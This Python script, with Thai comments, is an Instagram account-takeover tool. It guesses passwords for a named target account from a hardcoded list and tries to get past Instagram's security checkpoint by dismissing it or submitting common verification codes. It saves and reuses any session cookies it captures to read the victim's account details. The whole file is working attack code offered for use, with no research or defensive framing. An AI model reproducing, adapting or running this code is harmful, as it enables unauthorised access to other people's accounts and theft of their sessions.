#!/usr/bin/env python3
"""
CHECKPOINT BYPASS MONITORING & TOOLS
เครื่องมือตรวจสอบและควบคุมการ bypass checkpoint
"""

import requests
import json
import time
import random
from datetime import datetime
import threading

class CheckpointMonitor:
    def __init__(self):
        self.session = requests.Session()
        self.bypass_attempts = []
        self.successful_bypasses = []
        
    def monitor_bypass_progress(self):
        """ตรวจสอบความคืบหน้าของการ bypass"""
        print("🔍 CHECKPOINT BYPASS MONITOR")
        print("=" * 40)
        
        # ตรวจสอบไฟล์ผลลัพธ์
        import glob
        
        bypass_files = glob.glob("CHECKPOINT_BYPASSED_*.json")
        session_files = glob.glob("bypassed_session_*.json")
        
        print(f"📁 Bypass result files: {len(bypass_files)}")
        print(f"📁 Session files: {len(session_files)}")
        
        # แสดงรายละเอียดผลลัพธ์
        if bypass_files:
            print("\n✅ SUCCESSFUL BYPASSES:")
            for file in bypass_files:
                try:
                    with open(file, 'r') as f:
                        data = json.load(f)
                    
                    print(f"  🎯 {file}")
                    print(f"     Target: {data.get('target', 'unknown')}")
                    print(f"     Password: {data.get('successful_password', 'unknown')}")
                    print(f"     Method: {data.get('bypass_method', 'unknown')}")
                    print(f"     Time: {data.get('timestamp', 'unknown')}")
                    
                except Exception as e:
                    print(f"  ❌ Error reading {file}: {e}")
        
        if session_files:
            print("\n🔑 EXTRACTED SESSIONS:")
            for file in session_files:
                try:
                    with open(file, 'r') as f:
                        data = json.load(f)
                    
                    sessionid = data.get('sessionid', '')
                    print(f"  🎯 {file}")
                    print(f"     SessionID: {sessionid[:30]}...")
                    print(f"     User ID: {data.get('ds_user_id', 'unknown')}")
                    print(f"     Method: {data.get('method', 'unknown')}")
                    
                except Exception as e:
                    print(f"  ❌ Error reading {file}: {e}")
    
    def test_bypassed_sessions(self):
        """ทดสอบ session ที่ bypass ได้แล้ว"""
        print("\n🧪 TESTING BYPASSED SESSIONS")
        print("=" * 40)
        
        import glob
        session_files = glob.glob("bypassed_session_*.json")
        
        if not session_files:
            print("❌ No bypassed sessions found")
            return
        
        for file in session_files:
            try:
                with open(file, 'r') as f:
                    session_data = json.load(f)
                
                sessionid = session_data.get('sessionid', '')
                
                if sessionid:
                    print(f"\n🔄 Testing session from {file}")
                    
                    # ทดสอบด้วย instagrapi
                    try:
                        from instagrapi import Client
                        
                        cl = Client()
                        cl.login_by_sessionid(sessionid)
                        
                        user_info = cl.account_info()
                        print(f"✅ Session VALID!")
                        print(f"   Username: {user_info.username}")
                        print(f"   Full name: {user_info.full_name}")
                        print(f"   Followers: {user_info.follower_count}")
                        
                    except Exception as e:
                        print(f"❌ Session test failed: {e}")
                else:
                    print(f"❌ No sessionid in {file}")
                    
            except Exception as e:
                print(f"❌ Error testing {file}: {e}")

class QuickBypassTools:
    """เครื่องมือ bypass แบบเร็ว"""
    
    def __init__(self):
        self.session = requests.Session()
    
    def quick_checkpoint_test(self, username, password):
        """ทดสอบ checkpoint แบบเร็ว"""
        print(f"⚡ QUICK CHECKPOINT TEST: {username}:{password}")
        
        try:
            # Setup session
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            if 'csrftoken' in self.session.cookies:
                csrf_token = self.session.cookies['csrftoken']
            else:
                print("❌ No CSRF token")
                return False
            
            # Login attempt
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers
            )
            
            print(f"Status: {response.status_code}")
            
            try:
                resp_json = response.json()
                
                if "checkpoint_required" in str(resp_json):
                    checkpoint_url = resp_json.get('checkpoint_url', '')
                    print(f"🔒 Checkpoint: {checkpoint_url}")
                    
                    # ลองวิธีง่ายๆ ในการ bypass
                    return self.simple_bypass_attempt(checkpoint_url, csrf_token)
                    
                elif "sessionid" in str(self.session.cookies):
                    sessionid = self.session.cookies['sessionid']
                    print(f"✅ Direct login success! SessionID: {sessionid}")
                    return True
                else:
                    print("❌ Login failed")
                    return False
                    
            except Exception as e:
                print(f"❌ Response error: {e}")
                return False
                
        except Exception as e:
            print(f"❌ Test error: {e}")
            return False
    
    def simple_bypass_attempt(self, checkpoint_url, csrf_token):
        """ลองวิธี bypass แบบง่ายๆ"""
        print("🔄 Attempting simple bypass...")
        
        try:
            # ลองส่ง request ไปที่ checkpoint โดยตรง
            bypass_attempts = [
                {'choice': '0'},  # Phone
                {'choice': '1'},  # Email
                {'dismiss': '1'}, # Skip
                {'choice': '0', 'security_code': '123456'},  # Common code
                {'choice': '0', 'security_code': '000000'},
                {'choice': '0', 'security_code': '111111'}
            ]
            
            for attempt in bypass_attempts:
                print(f"🔄 Trying: {attempt}")
                
                headers = {
                    'X-CSRFToken': csrf_token,
                    'X-Instagram-AJAX': '1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': f'https://www.instagram.com{checkpoint_url}'
                }
                
                response = self.session.post(
                    f'https://www.instagram.com{checkpoint_url}',
                    data=attempt,
                    headers=headers
                )
                
                if response.status_code == 200:
                    # ตรวจสอบ session
                    if 'sessionid' in self.session.cookies:
                        sessionid = self.session.cookies['sessionid']
                        print(f"🎯 BYPASS SUCCESS! SessionID: {sessionid}")
                        
                        # บันทึกผลลัพธ์
                        result = {
                            "sessionid": sessionid,
                            "ds_user_id": self.session.cookies.get('ds_user_id', ''),
                            "bypass_method": "simple_bypass",
                            "attempt_data": attempt,
                            "timestamp": datetime.now().isoformat()
                        }
                        
                        with open(f"simple_bypass_success_{int(time.time())}.json", 'w') as f:
                            json.dump(result, f, indent=2)
                        
                        return True
                
                time.sleep(random.uniform(1, 3))
            
            print("❌ Simple bypass failed")
            return False
            
        except Exception as e:
            print(f"❌ Bypass error: {e}")
            return False
    
    def mass_bypass_test(self):
        """ทดสอบ bypass หลายรหัสผ่านพร้อมกัน"""
        print("🚀 MASS BYPASS TEST")
        print("=" * 30)
        
        valid_passwords = ["Fleming654", "Fleming786", "Fleming1004", "Fleming1060", "Fleming1182", "Fleming1998"]
        target = "alx.trading"
        
        results = []
        
        for i, password in enumerate(valid_passwords, 1):
            print(f"\n--- Test {i}/{len(valid_passwords)} ---")
            
            success = self.quick_checkpoint_test(target, password)
            
            results.append({
                "password": password,
                "success": success,
                "timestamp": datetime.now().isoformat()
            })
            
            if success:
                print(f"🎉 BREAKTHROUGH with {password}!")
                break
            
            # พักระหว่างการทดสอบ
            time.sleep(random.uniform(3, 7))
        
        # บันทึกผลรวม
        with open(f"mass_bypass_results_{int(time.time())}.json", 'w') as f:
            json.dump(results, f, indent=2)
        
        return results

def main():
    print("🎛️  CHECKPOINT BYPASS CONTROL CENTER")
    print("=" * 50)
    
    # Monitor existing bypass attempts
    monitor = CheckpointMonitor()
    monitor.monitor_bypass_progress()
    
    print("\n" + "=" * 50)
    
    # Test any existing sessions
    monitor.test_bypassed_sessions()
    
    print("\n" + "=" * 50)
    
    # Quick bypass test
    quick_tools = QuickBypassTools()
    
    print("\n🚀 Starting mass bypass test...")
    results = quick_tools.mass_bypass_test()
    
    # สรุปผลลัพธ์
    successful = [r for r in results if r['success']]
    
    print(f"\n📊 FINAL RESULTS:")
    print(f"   Tests run: {len(results)}")
    print(f"   Successful: {len(successful)}")
    print(f"   Success rate: {len(successful)/len(results)*100:.1f}%")
    
    if successful:
        print(f"\n🎯 SUCCESSFUL BYPASSES:")
        for result in successful:
            print(f"   ✅ {result['password']} - {result['timestamp']}")

if __name__ == "__main__":
    main()
